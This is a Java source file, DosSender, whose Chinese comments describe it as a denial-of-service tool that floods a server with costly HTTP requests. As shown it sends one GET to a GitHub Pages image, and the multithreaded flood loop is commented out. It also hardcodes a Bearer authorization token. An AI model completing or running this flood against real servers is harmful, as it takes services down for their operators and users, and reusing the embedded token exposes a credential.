package com.hl.security.dos;

import javax.imageio.ImageIO;
import javax.imageio.ImageReader;
import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.awt.image.ConvolveOp;
import java.awt.image.Kernel;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 拒绝服务攻击
 * 不停发送HTTP请求，让服务器执行消耗CPU,内存的复杂请求。直到耗尽
 */
public class DosSender {

    private final static BlurOp blurOp = new BlurOp();
    private static JPanel jPanel;

    public static void main(String[] args) {
        initGraph();
        attack();
    }

    private static void initGraph() {
        JFrame jFrame = new JFrame();
        jFrame.setSize(500, 500);
        jPanel = new JPanel();
        jPanel.setSize(500, 500);
        jFrame.add(jPanel);
        jFrame.setVisible(true);
    }

    private static void attack() {
        String url;
        url = "https://hlherbert.github.io/html/demo.htm";
        url = "https://hlherbert.github.io/html/demo.files/image012.jpg";
        attack(url);
    }

    private static void attack(String url) {
        ExecutorService executorService = Executors.newFixedThreadPool(10);

        while (true) {
            System.out.println(doGet(url));
            break;
            //System.out.print(". ");
//          executorService.submit(() -> {
//              int code = doGetNoResponse(url);
//              System.out.print(code+" ");
//          });
        }
    }

    /**
     * 不需要获得响应
     *
     * @param httpurl
     * @return
     */
    public static int doGetNoResponse(String httpurl) {
        HttpURLConnection connection = null;
        int result = 0;// 返回结果字符串
        try {
            // 创建远程url连接对象
            URL url = new URL(httpurl);
            // 通过远程url连接对象打开一个连接，强转成httpURLConnection类
            connection = (HttpURLConnection) url.openConnection();
            // 设置连接方式：get
            connection.setRequestMethod("GET");
            // 保持长连接
            connection.setRequestProperty("Connection", "keep-alive");

            // 设置建立连接超时时间：15000毫秒
            connection.setConnectTimeout(15000);

            // 设置读取远程返回的超时时间：60000毫秒
            connection.setReadTimeout(60000);

            // 发送请求
            connection.connect();

            // 通过connection连接，获取输入流
            return connection.getResponseCode();
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return result;
    }

    public static String doGet(String httpurl) {
        HttpURLConnection connection = null;
        InputStream is = null;
        BufferedReader br = null;
        ImageReader ir = null;
        String result = null;// 返回结果字符串
        try {
            // 创建远程url连接对象
            URL url = new URL(httpurl);
            // 通过远程url连接对象打开一个连接，强转成httpURLConnection类
            connection = (HttpURLConnection) url.openConnection();
            // 设置连接方式：get
            connection.setRequestMethod("GET");
            // 设置连接主机服务器的超时时间：15000毫秒
            connection.setConnectTimeout(15000);
            // 设置读取远程返回的数据时间：60000毫秒
            connection.setReadTimeout(60000);
            // 发送请求
            connection.connect();
            // 通过connection连接，获取输入流
            if (connection.getResponseCode() == 200) {
                is = connection.getInputStream();
                String type = "txt";
                if ("image/jpeg".equals(connection.getHeaderField("content-type"))) {
                    type = "img";
                }

                if ("txt".equals(type)) {
                    // 封装输入流is，并指定字符集
                    br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                    // 存放数据
                    StringBuffer sbf = new StringBuffer();
                    String temp = null;
                    while ((temp = br.readLine()) != null) {
                        sbf.append(temp);
                        sbf.append("\r\n");
                    }
                    result = sbf.toString();
                } else if ("img".equals(type)) {
                    BufferedImage img = ImageIO.read(is);
                    if (jPanel != null) {
                        Graphics2D g = (Graphics2D) jPanel.getGraphics();
                        if (g != null) {
                            g.drawImage(img, blurOp, 0, 0);
                        }
                        g = null;
                    }
                    result = img.toString();
                    img = null;
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            // 关闭资源
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if (null != is) {
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            connection.disconnect();// 关闭远程连接
        }

        return result;
    }

    public static String doPost(String httpUrl, String param) {

        HttpURLConnection connection = null;
        InputStream is = null;
        OutputStream os = null;
        BufferedReader br = null;
        String result = null;
        try {
            URL url = new URL(httpUrl);
            // 通过远程url连接对象打开连接
            connection = (HttpURLConnection) url.openConnection();
            // 设置连接请求方式
            connection.setRequestMethod("POST");
            // 设置连接主机服务器超时时间：15000毫秒
            connection.setConnectTimeout(15000);
            // 设置读取主机服务器返回数据超时时间：60000毫秒
            connection.setReadTimeout(60000);

            // 默认值为：false，当向远程服务器传送数据/写数据时，需要设置为true
            connection.setDoOutput(true);
            // 默认值为：true，当前向远程服务读取数据时，设置为true，该参数可有可无
            connection.setDoInput(true);
            // 设置传入参数的格式:请求参数应该是 name1=value1&name2=value2 的形式。
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            // 设置鉴权信息：Authorization: Bearer da3efcbf-0845-4fe3-8aba-ee040be542c0
            connection.setRequestProperty("Authorization", "Bearer da3efcbf-0845-4fe3-8aba-ee040be542c0");
            // 通过连接对象获取一个输出流
            os = connection.getOutputStream();
            // 通过输出流对象将参数写出去/传输出去,它是通过字节数组写出的
            os.write(param.getBytes());
            // 通过连接对象获取一个输入流，向远程读取
            if (connection.getResponseCode() == 200) {

                is = connection.getInputStream();
                // 对输入流对象进行包装:charset根据工作项目组的要求来设置
                br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));

                StringBuffer sbf = new StringBuffer();
                String temp = null;
                // 循环遍历一行一行读取数据
                while ((temp = br.readLine()) != null) {
                    sbf.append(temp);
                    sbf.append("\r\n");
                }
                result = sbf.toString();
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            // 关闭资源
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != os) {
                try {
                    os.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != is) {
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            // 断开与远程地址url的连接
            connection.disconnect();
        }
        return result;
    }

    private static class BlurOp extends ConvolveOp {
        final static float ninth = 1.0f / 9.0f;
        final static float[] blurKernel = {
                ninth, ninth, ninth,
                ninth, ninth, ninth,
                ninth, ninth, ninth
        };
        final static float[] sharpKernel = {
                0.0f, -1.0f, 0.0f,
                -1.0f, 5.0f, -1.0f,
                0.0f, -1.0f, 0.0f
        };

        BlurOp() {
            super(new Kernel(3, 3, sharpKernel));
        }
    }
}
